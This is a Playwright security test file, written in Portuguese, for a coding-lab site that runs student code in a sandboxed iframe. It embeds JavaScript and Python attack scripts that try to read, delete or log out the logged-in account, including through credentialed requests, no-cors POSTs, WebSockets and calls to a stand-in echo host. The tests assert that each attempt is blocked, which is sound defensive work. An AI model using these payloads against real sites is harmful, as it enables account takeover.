/**
 * Isolamento da execução do código do estudante (docs/SEGURANCA.md).
 *
 * O código do estudante roda na página de execução (public/runner.html), num
 * <iframe sandbox="allow-scripts"> sem allow-same-origin: origem opaca. Estes
 * testes atacam a conta a partir do laboratório, com uma conta logada, como faria
 * um link compartilhado (#codigo=) malicioso, e conferem que nada acontece.
 *
 * Só no projeto "desktop": o que se testa é o motor do navegador (Chromium), igual
 * nos dois projetos.
 */
import { execFileSync } from 'node:child_process';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import { test as base, expect, type APIRequestContext, type BrowserContext, type Cookie, type Page, type Request } from '@playwright/test';

type Conta = { email: string; id: string; cookies: Cookie[] } | null;
/**
 * Uma conta por processo de teste, e não por teste: o cadastro tem limite de 10 por 15 minutos por IP
 * (apps/api/src/app.ts), e todos os testes saem do mesmo IP. Cada teste entra com o cookie da sessão.
 * Se um ataque funcionasse (apagasse a conta ou encerrasse a sessão), os testes seguintes do mesmo
 * processo também falhariam, o que só deixa a falha mais visível.
 */
const test = base.extend<object, { conta: Conta }>({
  conta: [
    async ({ playwright }, use, info) => {
      if (info.project.name !== 'desktop') return use(null);
      const req = await playwright.request.newContext({ baseURL: info.project.use.baseURL });
      const email = `iso-${Date.now()}-${Math.random().toString(36).slice(2)}@exemplo.com`;
      const r = await req.post('/api/auth/register', { data: { email, password: SENHA, name: 'Pessoa' }, headers: { 'x-alicerce': '1' } });
      expect(r.status()).toBe(201);
      const id = (await r.json()).user.id as string;
      const p = await req.put('/api/progress', { data: { progress: PROGRESSO, expectedUserId: id }, headers: { 'x-alicerce': '1' } });
      expect((await p.json()).progress.modulesDone).toEqual(PROGRESSO.modulesDone);
      await use({ email, id, cookies: (await req.storageState()).cookies });
      await req.dispose();
    },
    { scope: 'worker' },
  ],
});

test.beforeEach(({}, info) => {
  test.skip(info.project.name !== 'desktop', 'isolamento: basta um projeto (o motor é o mesmo)');
});

const SENHA = 'uma frase bem longa';
/** Progresso conhecido no servidor; o ataque tenta acrescentar "m-atacado". */
const PROGRESSO = { version: 1, modulesDone: { 'm0-1': 1_700_000_000_000 } };

const lab = (lang: 'python' | 'javascript' | 'sql', code: string) => '/laboratorio#codigo=' + Buffer.from(JSON.stringify({ lang, code })).toString('base64url');
const saida = (page: Page) => page.locator('pre.output').first();
const executar = (page: Page) => page.getByRole('button', { name: /Executar/ }).first();

/**
 * Com a sessão no contexto, espera o site reconhecer a conta antes de mexer no laboratório.
 * Quando /api/auth/me responde, o Layout remonta a página (key = id da conta): o que foi
 * digitado ou executado antes disso se perde. Numa rodada da suíte inteira, sob carga, o clique
 * em "Executar" caiu antes da remontagem e a saída nunca apareceu.
 */
async function contaReconhecida(page: Page) {
  const cookies = await page.context().cookies();
  if (cookies.some((c) => c.name === 'alicerce_sessao' && c.value)) await expect(page.getByRole('link', { name: /^Conta de / })).toBeVisible();
}

/** Troca o código do editor (CodeMirror) sem recarregar a página. */
async function escrever(page: Page, code: string) {
  await contaReconhecida(page);
  const ed = page.locator('.cm-content').first();
  await expect(ed).toBeVisible();
  await ed.click();
  await page.keyboard.press('ControlOrMeta+a');
  await page.keyboard.press('Delete');
  await page.keyboard.insertText(code);
}

async function rodar(page: Page, fim: string | RegExp, timeout = 60_000) {
  await contaReconhecida(page);
  await executar(page).click();
  await expect(saida(page)).toContainText(fim, { timeout });
  await expect(executar(page)).toBeEnabled();
  return (await saida(page).textContent()) ?? '';
}

/** Entra com a conta do processo (cookie da sessão no contexto da página) e confere que ela está intacta. */
async function criarConta(page: Page, conta: Conta) {
  if (!conta) throw new Error('conta só existe no projeto desktop');
  await page.context().addCookies(conta.cookies);
  await contaIntacta(page, conta.email);
  return { email: conta.email, id: conta.id };
}

/** A conta continua existindo, com a sessão ativa, e o progresso não ganhou nada do ataque. */
async function contaIntacta(page: Page, email: string) {
  const me = await (await page.request.get('/api/auth/me')).json();
  expect(me.user?.email).toBe(email);
  // PUT com progresso vazio só devolve o que já está guardado (a combinação é uma união)
  const p = await (await page.request.put('/api/progress', { data: { progress: {}, expectedUserId: me.user.id }, headers: { 'x-alicerce': '1' } })).json();
  expect(p.progress.modulesDone['m0-1']).toBe(PROGRESSO.modulesDone['m0-1']);
  expect(p.progress.modulesDone['m-atacado']).toBeUndefined();
}

/**
 * Registra as requisições do ataque (marcadas com ?ataque=) que o navegador tentou fazer,
 * com o desfecho de cada uma: resposta recebida ou motivo da falha ("csp" = barrada pela CSP
 * antes de sair). Requisições barradas pela CSP dentro do fetch() de um worker nem aparecem.
 */
function vigiarAtaque(context: BrowserContext) {
  const vistas = new Map<Request, { metodo: string; url: string; cookie: boolean; desfecho: string }>();
  context.on('request', (req) => {
    if (req.url().includes('ataque=')) vistas.set(req, { metodo: req.method(), url: req.url(), cookie: false, desfecho: 'pendente' });
  });
  const fim = async (req: Request, desfecho: string) => {
    const v = vistas.get(req);
    if (!v) return;
    const h = await req.allHeaders().catch(() => ({}) as Record<string, string>);
    v.cookie = /alicerce_sessao=/.test(h['cookie'] ?? '');
    v.desfecho = desfecho;
  };
  context.on('requestfinished', async (req) => fim(req, `HTTP ${(await req.response())?.status()}`));
  context.on('requestfailed', (req) => fim(req, `falhou ${req.failure()?.errorText}`));
  return () => [...vistas.values()].map((v) => `${v.metodo} ${v.url} cookie=${v.cookie ? 'sim' : 'não'} ${v.desfecho}`);
}

/** Nada do ataque saiu com o cookie da sessão, e nenhuma mutação recebeu resposta. */
function semCookieNemMutacao(vistas: string[]) {
  for (const v of vistas) {
    expect(v).toContain('cookie=não');
    if (!/^(GET|HEAD|OPTIONS) /.test(v)) expect(v).toMatch(/ falhou /);
  }
}

/**
 * Servidor de eco em outra porta do mesmo host. Cookies não separam portas: se o pedido
 * saísse com a origem do site, o cookie da sessão (SameSite=Lax) iria junto. O eco anota o
 * que chegou, libera a leitura de GET para qualquer origem e responde ao preflight como a
 * API (sem Access-Control-Allow-*).
 */
async function servidorEco() {
  const recebidas: string[] = [];
  const srv = createServer((req, res) => {
    const cookie = /alicerce_sessao=/.test(req.headers.cookie ?? '') ? 'sim' : 'não';
    recebidas.push(`${req.method} ${req.url} cookie=${cookie} origin=${req.headers.origin ?? '-'}`);
    if (req.method === 'OPTIONS') return res.writeHead(204).end();
    // libera a leitura para qualquer origem, com credenciais: o pior caso, um servidor que aceita tudo
    res.writeHead(200, { 'access-control-allow-origin': req.headers.origin ?? '*', 'access-control-allow-credentials': 'true', 'content-type': 'text/plain' }).end('eco');
  });
  // WebSocket: anota o pedido de upgrade e recusa
  srv.on('upgrade', (req, socket) => {
    const cookie = /alicerce_sessao=/.test(req.headers.cookie ?? '') ? 'sim' : 'não';
    recebidas.push(`UPGRADE ${req.url} cookie=${cookie} origin=${req.headers.origin ?? '-'}`);
    socket.destroy();
  });
  await new Promise<void>((r) => srv.listen(0, '127.0.0.1', r));
  const url = `http://127.0.0.1:${(srv.address() as AddressInfo).port}`;
  return { url, recebidas, fechar: () => new Promise<void>((r) => srv.close(() => r())) };
}

/**
 * O PUT leva o id certo da conta (expectedUserId, que a API confere): o pedido é válido, e o que
 * o barra é só o isolamento. O ataque de verdade nem saberia o id, que é aleatório.
 */
const alvos = (userId: string) => [
  ['GET', '/api/auth/me'],
  ['DELETE', '/api/auth/me'],
  ['PUT', '/api/progress', JSON.stringify({ expectedUserId: userId, progress: { version: 1, modulesDone: { 'm-atacado': 1 } } })],
  ['POST', '/api/auth/logout'],
  ['POST', '/api/tutor', JSON.stringify({ question: 'oi', lessonTitle: 'x' })],
];
const N_ALVOS = alvos('').length;
/** fetch (2 URLs x 3 modos de credencial) + XMLHttpRequest síncrono, por alvo; mais o import() */
const LINHAS_JS = N_ALVOS * 7 + 1;

function ataqueJs(origem: string, eco: string, userId: string) {
  return `const ORIGEM = ${JSON.stringify(origem)};
const ECO = ${JSON.stringify(eco)};
const ALVOS = ${JSON.stringify(alvos(userId))};
const linhas = [];
async function tentar(rotulo, url, opcoes) {
  try {
    const r = await fetch(url, opcoes);
    linhas.push(\`\${rotulo}: HTTP \${r.status} \${await r.text()}\`);
  } catch (e) {
    linhas.push(\`\${rotulo}: bloqueado (\${e.name})\`);
  }
}
for (const [metodo, caminho, corpo] of ALVOS) {
  for (const url of [ORIGEM + caminho + '?ataque=abs', caminho + '?ataque=rel']) {
    for (const credentials of ['include', 'same-origin', 'omit']) {
      await tentar(\`fetch \${metodo} \${url} \${credentials}\`, url, { method: metodo, credentials, headers: { 'x-alicerce': '1', 'content-type': 'application/json' }, body: corpo });
    }
  }
  try {
    const x = new XMLHttpRequest();
    x.open(metodo, ORIGEM + caminho + '?ataque=xhr', false);
    x.withCredentials = true;
    x.setRequestHeader('x-alicerce', '1');
    x.setRequestHeader('content-type', 'application/json');
    x.send(corpo ?? null);
    linhas.push(\`xhr \${metodo} \${caminho}: HTTP \${x.status} \${x.responseText}\`);
  } catch (e) {
    linhas.push(\`xhr \${metodo} \${caminho}: bloqueado (\${e.name})\`);
  }
}
try {
  const m = await import(ORIGEM + '/api/auth/me?ataque=import');
  linhas.push('import: ' + JSON.stringify(m));
} catch (e) {
  linhas.push('import: bloqueado (' + e.name + ')');
}
await tentar('eco GET', ECO + '/eco?ataque=eco-get', { credentials: 'include' });
await tentar('eco DELETE', ECO + '/eco?ataque=eco-delete', { method: 'DELETE', credentials: 'include', headers: { 'x-alicerce': '1' } });
console.log(linhas.join('\\n'));
console.log('FIM');
`;
}

function ataquePython(origem: string, eco: string, userId: string) {
  return `import sys
from js import fetch, XMLHttpRequest, Object
from pyodide.ffi import to_js
from pyodide.http import open_url

ORIGEM = ${JSON.stringify(origem)}
ECO = ${JSON.stringify(eco)}
ALVOS = ${JSON.stringify(alvos(userId))}
linhas = []
# XMLHttpRequest síncrono (é o que pyodide.http.open_url usa por baixo)
for alvo in ALVOS + [["GET", "/eco"]]:
    metodo, caminho = alvo[0], alvo[1]
    corpo = alvo[2] if len(alvo) > 2 else None
    base = ECO if caminho == "/eco" else ORIGEM
    try:
        x = XMLHttpRequest.new()
        x.open(metodo, base + caminho + "?ataque=pyxhr", False)
        x.withCredentials = True
        x.setRequestHeader("x-alicerce", "1")
        x.setRequestHeader("content-type", "application/json")
        x.send(corpo)
        linhas.append(f"xhr {metodo} {caminho}: HTTP {x.status} {x.responseText}")
    except Exception as e:
        linhas.append(f"xhr {metodo} {caminho}: bloqueado ({type(e).__name__})")
try:
    linhas.append("open_url: " + open_url(ORIGEM + "/api/auth/me?ataque=open_url").read())
except Exception as e:
    linhas.append(f"open_url: bloqueado ({type(e).__name__})")

# from js import fetch: as respostas chegam depois desta execução e ficam guardadas em sys
sys.ataque = []
for alvo in ALVOS:
    metodo, caminho = alvo[0], alvo[1]
    for cred in ("include", "same-origin"):
        rotulo = f"fetch {metodo} {caminho} {cred}"
        opcoes = {"method": metodo, "credentials": cred, "headers": {"x-alicerce": "1", "content-type": "application/json"}}
        if len(alvo) > 2:
            opcoes["body"] = alvo[2]
        def ok(r, rotulo=rotulo):
            return r.text().then(lambda t: sys.ataque.append(f"{rotulo}: HTTP {r.status} {t}"))
        def falhou(e, rotulo=rotulo):
            sys.ataque.append(f"{rotulo}: bloqueado ({e})")
        fetch(ORIGEM + caminho + "?ataque=pyfetch", to_js(opcoes, dict_converter=Object.fromEntries)).then(ok, falhou)
print("\\n".join(linhas))
print("FIM 1")
`;
}

const COLETA_PYTHON = `import sys
r = getattr(sys, "ataque", [])
print("\\n".join(r))
print("FIM 2")
`;

test('ataque em JavaScript com conta logada não toca a conta, o progresso nem o e-mail', async ({ page, context, baseURL, conta }) => {
  const eco = await servidorEco();
  const { email, id } = await criarConta(page, conta);
  const vistas = vigiarAtaque(context);
  await page.goto('/laboratorio');
  // Controle: na origem do site, o mesmo pedido leva o cookie e lê o e-mail (é isso que o isolamento impede),
  // e o mesmo corpo do PUT do ataque é aceito (com outro módulo, para não confundir com o do ataque).
  expect(await page.evaluate(async () => (await fetch('/api/auth/me?ataque=controle')).text())).toContain(email);
  const controlePut = alvos(id)[2]![2]!.replace('m-atacado', 'm-controle');
  expect(
    await page.evaluate(async (corpo) => (await fetch('/api/progress?ataque=controle', { method: 'PUT', headers: { 'x-alicerce': '1', 'content-type': 'application/json' }, body: corpo })).text(), controlePut),
  ).toContain('m-controle');
  await expect.poll(() => vistas()).toEqual([
    expect.stringMatching(/^GET .*ataque=controle cookie=sim HTTP 200$/),
    expect.stringMatching(/^PUT .*ataque=controle cookie=sim HTTP 200$/),
  ]);

  await page.goto(lab('javascript', ataqueJs(baseURL!, eco.url, id)));
  await page.reload(); // o código do link é lido quando a página monta
  const out = await rodar(page, 'FIM', 30_000);
  const linhas = out.split('\n').filter((l) => /^(fetch|xhr|import|eco)/.test(l));
  expect(linhas.length).toBe(LINHAS_JS + 2);
  for (const l of linhas) expect(l).toMatch(/bloqueado/);
  expect(out).not.toContain(email);
  expect(out).not.toContain('HTTP ');
  // A CSP da página de execução (connect-src 'none') barra fetch e XMLHttpRequest antes da rede.
  // Só o import() de um endereço do próprio site sai (script-src 'self'): GET, sem cookie, sem leitura.
  const ataque = vistas().filter((v) => !v.includes('controle'));
  semCookieNemMutacao(ataque);
  for (const v of ataque) expect(v).toMatch(/ falhou csp$|ataque=import cookie=não falhou/);
  expect(eco.recebidas).toEqual([]);
  await contaIntacta(page, email);
  await eco.fechar();
});

test('ataque em Python (from js import fetch, XMLHttpRequest, pyodide.http) não toca a conta', async ({ page, context, baseURL, conta }) => {
  test.setTimeout(120_000);
  const eco = await servidorEco();
  const { email, id } = await criarConta(page, conta);
  const vistas = vigiarAtaque(context);
  await page.goto(lab('python', ataquePython(baseURL!, eco.url, id)));
  const out1 = await rodar(page, 'FIM 1', 90_000);
  const sincronas = out1.split('\n').filter((l) => /^(xhr|open_url)/.test(l));
  expect(sincronas.length).toBe(N_ALVOS + 2);
  for (const l of sincronas) expect(l).toMatch(/bloqueado/);
  expect(out1).not.toContain(email);

  // As promessas do fetch terminam depois da primeira execução; a segunda lê o que elas guardaram.
  await page.waitForTimeout(1500);
  await escrever(page, COLETA_PYTHON);
  const out2 = await rodar(page, 'FIM 2');
  const assincronas = out2.split('\n').filter((l) => l.startsWith('fetch'));
  expect(assincronas.length).toBe(N_ALVOS * 2);
  for (const l of assincronas) expect(l).toMatch(/bloqueado/);
  expect(out2).not.toContain(email);
  expect(out2).not.toContain('HTTP ');
  semCookieNemMutacao(vistas());
  for (const v of vistas()) expect(v).toMatch(/ falhou csp$/);
  expect(eco.recebidas).toEqual([]);
  await contaIntacta(page, email);
  await eco.fechar();
});

test('sem a CSP, a origem opaca sozinha ainda protege a conta (segunda camada)', async ({ browser, baseURL, conta }) => {
  // bypassCSP desliga a CSP (inclusive a diretiva sandbox do servidor e a meta da página de execução).
  // Sobra o atributo sandbox do iframe: origem opaca, sem cookie e sem leitura da resposta.
  const eco = await servidorEco();
  const context = await browser.newContext({ bypassCSP: true, baseURL: baseURL! });
  const page = await context.newPage();
  const { email, id } = await criarConta(page, conta);
  await page.goto('/laboratorio');
  // Controle: da origem do site, o pedido ao eco leva o cookie da sessão.
  expect(await page.evaluate(async (u) => (await fetch(u + '/eco?ataque=controle', { credentials: 'include' })).text(), eco.url)).toBe('eco');
  expect(eco.recebidas).toEqual([expect.stringMatching(/^GET \/eco\?ataque=controle cookie=sim origin=http/)]);
  eco.recebidas.length = 0;

  const vistas = vigiarAtaque(context);
  await page.goto(lab('javascript', ataqueJs(baseURL!, eco.url, id)));
  await page.reload();
  const out = await rodar(page, 'FIM', 30_000);
  const linhas = out.split('\n').filter((l) => /^(fetch|xhr|import)/.test(l));
  expect(linhas.length).toBe(LINHAS_JS);
  for (const l of linhas) expect(l).toMatch(/bloqueado/);
  expect(out).not.toContain(email);
  // Desta vez os pedidos saem (sem CSP), mas da origem "null": sem cookie, e o preflight barra o DELETE.
  expect(out).toContain('eco GET: HTTP 200 eco');
  expect(out).toMatch(/eco DELETE: bloqueado/);
  expect(eco.recebidas).toEqual([
    'GET /eco?ataque=eco-get cookie=não origin=null',
    'OPTIONS /eco?ataque=eco-delete cookie=não origin=null',
  ]);
  expect(vistas().length).toBeGreaterThan(0);
  semCookieNemMutacao(vistas());
  await contaIntacta(page, email);
  await context.close();
  await eco.fechar();
});

test('o código do estudante não enxerga localStorage, cookies, IndexedDB nem a página do site', async ({ page, context, baseURL }) => {
  await context.addCookies([{ name: 'segredo_visivel', value: 'cookie-do-site', url: baseURL! }]);
  await page.goto('/laboratorio');
  await page.evaluate(async () => {
    localStorage.setItem('alicerce:segredo', 'dado-do-site');
    await new Promise<void>((res, rej) => {
      const req = indexedDB.open('alicerce-segredo', 1);
      req.onupgradeneeded = () => req.result.createObjectStore('s');
      req.onsuccess = () => {
        req.result.close();
        res();
      };
      req.onerror = () => rej(req.error);
    });
  });
  // 1) Dentro do worker onde o JavaScript do estudante roda
  const js = `const r = { origem: self.origin, document: typeof document, localStorage: typeof localStorage, parent: typeof parent };
try { r.databases = JSON.stringify(await indexedDB.databases()); } catch (e) { r.databases = 'erro ' + e.name; }
try { indexedDB.open('alicerce-segredo'); r.open = 'aberto'; } catch (e) { r.open = 'erro ' + e.name; }
try { r.caches = String(await caches.keys()); } catch (e) { r.caches = 'erro ' + e.name; }
console.log(JSON.stringify(r));
console.log('FIM');`;
  await page.getByRole('button', { name: 'JavaScript' }).click();
  await escrever(page, js);
  const out = await rodar(page, 'FIM');
  const r = JSON.parse(out.split('\n')[0]!);
  expect(r).toMatchObject({ origem: 'null', document: 'undefined', localStorage: 'undefined', parent: 'undefined' });
  expect(r.databases).toMatch(/^erro/);
  expect(r.open).toMatch(/^erro/);
  expect(r.caches).toMatch(/^erro|^$/);
  expect(out).not.toContain('alicerce-segredo');

  // 2) No Python
  await page.getByRole('button', { name: 'Python' }).click();
  await escrever(page, 'import js\nprint(js.self.origin, hasattr(js, "localStorage"), hasattr(js, "document"), hasattr(js, "parent"))\nprint("FIM")');
  expect(await rodar(page, 'FIM', 60_000)).toContain('null False False False');

  // 3) Mesmo se o código escapasse do worker para a página de execução (a thread do iframe)
  const frame = page.frames().find((f) => f.url().includes('runner.html'));
  expect(frame).toBeTruthy();
  const dentro = await frame!.evaluate(async () => {
    const tentar = async (f: () => unknown) => {
      try {
        return `ok: ${String(await f())}`;
      } catch (e) {
        return `erro ${(e as Error).name}`;
      }
    };
    return {
      origem: self.origin,
      localStorage: await tentar(() => localStorage.getItem('alicerce:segredo')),
      cookie: await tentar(() => document.cookie),
      parentDocument: await tentar(() => parent.document.title),
      parentStorage: await tentar(() => parent.localStorage.getItem('alicerce:segredo')),
      indexedDB: await tentar(() => indexedDB.open('alicerce-segredo')),
      databases: await tentar(async () => JSON.stringify(await indexedDB.databases())),
    };
  });
  expect(dentro.origem).toBe('null');
  for (const k of ['localStorage', 'cookie', 'parentDocument', 'parentStorage', 'indexedDB', 'databases'] as const) {
    expect(dentro[k], k).toMatch(/^erro (SecurityError|Error)/);
  }
  expect(JSON.stringify(dentro)).not.toContain('dado-do-site');
  expect(JSON.stringify(dentro)).not.toContain('cookie-do-site');
});

test('a página de execução aberta diretamente não executa nada', async ({ page, baseURL }) => {
  // Aberta direto, parent === window: se runner.js não recusasse, o "pronto" com o canal chegaria à própria página.
  await page.addInitScript(() => {
    const w = window as unknown as { recebidas: unknown[] };
    w.recebidas = [];
    addEventListener('message', (e) => w.recebidas.push({ data: e.data, portas: e.ports.length }));
  });
  const res = await page.goto('/runner.html');
  expect(res!.headers()['content-security-policy']).toMatch(/^sandbox allow-scripts;/);
  await expect(page.locator('#aviso')).toContainText('Nada foi executado');
  expect(await page.evaluate(() => self.origin)).toBe('null');
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => (window as unknown as { recebidas: unknown[] }).recebidas)).toEqual([]);
  // Ninguém escuta: um pedido de execução mandado à página não cria worker nem resposta.
  const resposta = await page.evaluate(
    () =>
      new Promise<string>((res) => {
        const ch = new MessageChannel();
        ch.port1.onmessage = (e) => res(JSON.stringify(e.data));
        window.postMessage({ alicerce: 'runner', type: 'porta', v: 1 }, '*', [ch.port2]);
        ch.port1.postMessage({ id: 1, op: 'js:run', workerCode: 'postMessage({result:{ok:true,stdout:"rodou",error:null}})', code: '' });
        setTimeout(() => res('sem resposta'), 1500);
      }),
  );
  expect(resposta).toBe('sem resposta');
  expect(page.workers()).toHaveLength(0);

  // Emoldurada por outra origem (localhost x 127.0.0.1): frame-ancestors 'self' barra o carregamento.
  const outra = baseURL!.replace('127.0.0.1', 'localhost');
  await page.goto(`${outra}/404-qualquer`);
  const pronto = await page.evaluate(
    (src) =>
      new Promise<string>((res) => {
        addEventListener('message', (e) => res(JSON.stringify(e.data)));
        const f = document.createElement('iframe');
        f.setAttribute('sandbox', 'allow-scripts');
        f.src = src;
        document.body.appendChild(f);
        setTimeout(() => res('sem resposta'), 3000);
      }),
    `${baseURL}/runner.html`,
  );
  expect(pronto).toBe('sem resposta');
});

test('laço infinito em Python e em JavaScript estoura o tempo, a página segue respondendo e a próxima execução funciona', async ({ page }) => {
  test.setTimeout(120_000);
  await page.goto(lab('python', 'print("aquecendo")'));
  await rodar(page, 'aquecendo', 60_000);

  // Python: tarefa asyncio pendente não sobrevive ao fim da execução
  await escrever(page, 'import asyncio, sys\nasync def depois():\n    await asyncio.sleep(0.2)\n    sys.vazou = True\nasyncio.ensure_future(depois())\nprint("tarefa criada")');
  await rodar(page, 'tarefa criada');
  await page.waitForTimeout(1000);
  await escrever(page, 'import sys\nprint("vazou:", getattr(sys, "vazou", False))');
  expect(await rodar(page, 'vazou:')).toContain('vazou: False');

  await escrever(page, 'while True:\n    pass');
  const inicio = Date.now();
  await executar(page).click();
  // durante o laço, a página do site continua respondendo
  await page.waitForTimeout(1000);
  expect(await page.evaluate(() => document.title)).toContain('Laboratório');
  await expect(page.getByText('O programa não terminou a tempo').first()).toBeVisible({ timeout: 20_000 });
  expect(Date.now() - inicio).toBeLessThan(15_000);
  await escrever(page, 'print("de volta", 6 * 7)');
  await rodar(page, 'de volta 42', 60_000);

  await page.getByRole('button', { name: 'JavaScript' }).click();
  await escrever(page, 'while (true) {}');
  await executar(page).click();
  await page.waitForTimeout(1000);
  expect(await page.evaluate(() => 1 + 1)).toBe(2);
  await expect(page.getByText('O programa não terminou a tempo').first()).toBeVisible({ timeout: 15_000 });
  await escrever(page, 'console.log("js de volta", 6 * 7)');
  await rodar(page, 'js de volta 42');
});

test('falha ao baixar o Python na primeira vez não impede a segunda', async ({ page }) => {
  test.setTimeout(120_000);
  let tentativas = 0;
  await page.route('**/pyodide/pyodide.asm.wasm', async (route) => {
    tentativas++;
    if (tentativas === 1) await route.abort('connectionreset');
    else await route.continue();
  });
  await page.goto(lab('python', 'print("python ok")'));
  await executar(page).click();
  await expect(page.getByText(/Não foi possível baixar o Python/).first()).toBeVisible({ timeout: 30_000 });
  await expect(executar(page)).toBeEnabled();
  await rodar(page, 'python ok', 90_000);
  expect(tentativas).toBe(2);
});

test('falha ao iniciar o Python dentro da página de execução não impede a segunda tentativa', async ({ page }) => {
  test.setTimeout(120_000);
  let tentativas = 0;
  // bytes inválidos: o download funciona, mas o WebAssembly não compila dentro do worker
  await page.route('**/pyodide/pyodide.asm.wasm', async (route) => {
    tentativas++;
    if (tentativas === 1) await route.fulfill({ status: 200, contentType: 'application/wasm', body: Buffer.from('isto não é wasm') });
    else await route.continue();
  });
  await page.goto(lab('python', 'print("python ok")'));
  await executar(page).click();
  // falha logo (o wasm é conferido antes de o Pyodide tentar carregá-lo), sem esperar o tempo limite de 90 s
  await expect(page.getByText(/Não foi possível iniciar o Python \(o arquivo pyodide\.asm\.wasm chegou corrompido/).first()).toBeVisible({ timeout: 20_000 });
  await expect(executar(page)).toBeEnabled();
  await rodar(page, 'python ok', 90_000);
  expect(tentativas).toBe(2);
});

test('saída de 1 milhão de caracteres chega cortada e a página continua respondendo', async ({ page }) => {
  test.setTimeout(120_000);
  // Dentro do harness há um limite próprio (_BoundedOutput): o programa para com um aviso.
  await page.goto(lab('python', 'print("x" * 1_000_000)'));
  await executar(page).click();
  await expect(page.getByText(/Saída limitada a 65536 caracteres/).first()).toBeVisible({ timeout: 60_000 });
  await expect(executar(page)).toBeEnabled();
  expect(((await saida(page).textContent()) ?? '').length).toBeLessThanOrEqual(65_536);
  // O código do estudante contorna esse limite (escreve direto no StringIO de baixo): quem corta é a fronteira.
  await escrever(page, 'import io, sys\nio.StringIO.write(sys.stdout, "x" * 1_000_000)');
  const py = await rodar(page, 'saída cortada', 60_000);
  expect(py.length).toBeLessThan(65_536 + 200);
  expect(py).toContain('65.536');
  expect(await page.evaluate(() => document.title)).toContain('Laboratório');

  // passo a passo: cada passo leva a saída acumulada; o total é limitado e a interface avisa
  // (60.000 caracteres impressos uma vez, abaixo do teto de cada texto, repetidos em dezenas de passos)
  await escrever(page, 'print("z" * 60_000)\nfor i in range(30):\n    x = i\n');
  await page.getByRole('button', { name: /Passo a passo/ }).click();
  await expect(page.getByText(/passo a passo cortado/)).toBeVisible({ timeout: 60_000 });

  // JavaScript: o limite de dentro do worker (output-limit.ts) para o programa; o resultado forjado,
  // que passa por cima dele, está no teste "resultado forjado" abaixo.
  await page.getByRole('button', { name: 'JavaScript' }).click();
  await escrever(page, 'console.log("y".repeat(1_000_000))');
  await executar(page).click();
  await expect(page.getByText(/Saída limitada a 65536 caracteres/).first()).toBeVisible({ timeout: 20_000 });
  await expect(executar(page)).toBeEnabled();
  expect(((await saida(page).textContent()) ?? '').length).toBeLessThanOrEqual(65_536);
  await page.getByRole('button', { name: 'SQL (SQLite)' }).click();
  await expect(page.getByRole('button', { name: 'Python' })).toBeEnabled();
});

test('mensagem de erro gigante (Python e JavaScript) não trava a página do site', async ({ page }) => {
  test.setTimeout(120_000);
  // A explicação do erro roda na página do site, com expressões regulares sobre a mensagem que vem do
  // código do estudante. Antes, 'a' x 65.536 levava cerca de 4 s em cada uma das piores (medido no
  // Chromium), com a página travada.
  await page.goto(lab('python', 'print("aquecendo")'));
  await rodar(page, 'aquecendo', 60_000);
  const maiorTarefa = async () => {
    await page.waitForTimeout(300);
    return page.evaluate(() => (window as unknown as { maior: number }).maior);
  };
  await page.evaluate(() => {
    const w = window as unknown as { maior: number };
    w.maior = 0;
    new PerformanceObserver((l) => {
      for (const e of l.getEntries()) w.maior = Math.max(w.maior, e.duration);
    }).observe({ type: 'longtask' });
  });
  await escrever(page, 'raise NameError("a" * 70_000)');
  await executar(page).click();
  await expect(page.locator('.error-explainer').first()).toContainText('NameError', { timeout: 60_000 });
  expect(await maiorTarefa()).toBeLessThan(1_000);

  await page.getByRole('button', { name: 'JavaScript' }).click();
  await escrever(page, 'throw new TypeError("a".repeat(70_000))');
  await executar(page).click();
  await expect(page.locator('.error-explainer').first()).toContainText('TypeError', { timeout: 20_000 });
  expect(await maiorTarefa()).toBeLessThan(1_000);
});

test('resultado SQL gigante chega cortado e não trava a página do site', async ({ page }) => {
  test.setTimeout(120_000);
  // 200 linhas x 200 colunas de 1.000 caracteres: cada parte abaixo dos tetos de linhas, colunas e
  // célula. Antes, desenhar a tabela deixava uma tarefa de 17 s na página (medido no Chromium).
  const colunas = Array.from({ length: 200 }, (_, i) => `printf('%.1000c', 'x') AS c${i}`).join(', ');
  const q = `WITH RECURSIVE n(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM n WHERE i < 200) SELECT ${colunas} FROM n`;
  await page.goto(lab('sql', q));
  await page.reload();
  await page.evaluate(() => {
    const w = window as unknown as { maior: number };
    w.maior = 0;
    new PerformanceObserver((l) => {
      for (const e of l.getEntries()) w.maior = Math.max(w.maior, e.duration);
    }).observe({ type: 'longtask' });
  });
  await executar(page).click();
  await expect(page.getByText(/linha\(s\) \(resultado cortado: grande demais\)/)).toBeVisible({ timeout: 90_000 });
  await page.waitForTimeout(300);
  expect(await page.evaluate(() => (window as unknown as { maior: number }).maior)).toBeLessThan(1_500);
});

/* ---------- Ataques acrescentados na revisão ---------- */

/** Canais que não são fetch nem XMLHttpRequest, mais POST no-cors sem x-alicerce (requisição "simples", sem preflight). */
function ataqueSemFetch(origem: string, eco: string) {
  return `const O = ${JSON.stringify(origem)};
const ECO = ${JSON.stringify(eco)};
const linhas = [];
const tentar = async (rotulo, f) => { try { linhas.push(rotulo + ': ' + (await f())); } catch (e) { linhas.push(rotulo + ': bloqueado (' + e.name + ')'); } };
const erro = (nome) => Object.assign(new Error(nome), { name: nome });
const ws = (u) => new Promise((res, rej) => { const s = new WebSocket(u); s.onopen = () => res('ABERTO'); s.onerror = () => rej(erro('ErroWebSocket')); setTimeout(() => rej(erro('Tempo')), 2000); });
await tentar('websocket site', () => ws(O.replace(/^http/, 'ws') + '/api/auth/me?ataque=ws'));
await tentar('websocket eco', () => ws(ECO.replace(/^http/, 'ws') + '/?ataque=ws-eco'));
for (const c of ['/api/auth/logout', '/%61pi/auth/logout', '/api/tutor', '/%61pi/auth/me']) {
  await tentar('no-cors POST ' + c, async () => { const r = await fetch(O + c + '?ataque=nocors', { method: 'POST', mode: 'no-cors', credentials: 'include', headers: { 'content-type': 'text/plain' }, body: '{"question":"oi","lessonTitle":"x"}' }); return 'ENVIADO ' + r.type; });
}
await tentar('importScripts', () => new Promise((res, rej) => {
  const w = new Worker('data:text/javascript,' + encodeURIComponent('try { importScripts(' + JSON.stringify(O + '/api/auth/me?ataque=importScripts') + '); postMessage("CARREGOU") } catch (e) { postMessage("bloqueado (" + e.name + ")") }'));
  w.onmessage = (m) => res(m.data); w.onerror = (x) => { x.preventDefault(); rej(erro('ErroWorker')); }; setTimeout(() => rej(erro('Tempo')), 3000);
}));
